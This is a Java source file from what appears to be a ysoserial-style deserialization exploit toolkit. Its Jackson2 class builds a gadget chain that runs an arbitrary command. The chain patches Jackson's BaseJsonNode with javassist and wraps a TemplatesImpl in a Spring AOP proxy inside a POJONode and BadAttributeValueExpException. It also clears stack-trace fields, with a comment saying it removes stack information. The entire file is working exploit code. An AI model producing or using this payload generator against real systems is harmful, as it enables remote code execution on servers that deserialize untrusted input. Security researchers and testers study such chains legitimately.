package com.qi4l.JYso.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unused"})
public class Jackson2 implements ObjectPayload<Object> {
    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
    }

    public Object getObject(final String command) throws Exception {

        try {
            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
            ctClass.removeMethod(writeReplace);
            ctClass.toClass();
        } catch (Exception ignored) {

        }
        POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);
        //清除堆栈信息
        setFieldValue(val, "stackTrace", new StackTraceElement[0]);
        setFieldValue(val, "cause", null);
        setFieldValue(val, "suppressedExceptions", null);
        return val;
    }
}
